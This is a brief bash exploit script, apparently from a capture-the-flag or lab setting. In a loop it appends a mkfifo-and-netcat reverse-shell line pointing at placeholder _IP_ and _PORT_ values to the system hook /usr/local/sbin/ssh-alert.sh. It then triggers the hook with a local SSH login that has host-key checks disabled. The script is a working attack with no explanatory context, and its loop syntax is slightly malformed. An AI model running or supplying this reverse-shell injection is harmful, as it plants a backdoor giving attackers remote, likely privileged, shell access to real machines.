#!/bin/bash

export TERM=xterm
while ! grep -q mkfifo /usr/local/sbin/ssh-alert.sh 
do;
    echo 'rm /tmp/f2;mkfifo /tmp/f2;cat /tmp/f2|bash -i 2>&1|nc _IP_ _PORT_ >/tmp/f2' >> /usr/local/sbin/ssh-alert.sh
done;
ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no 127.0.0.1 id
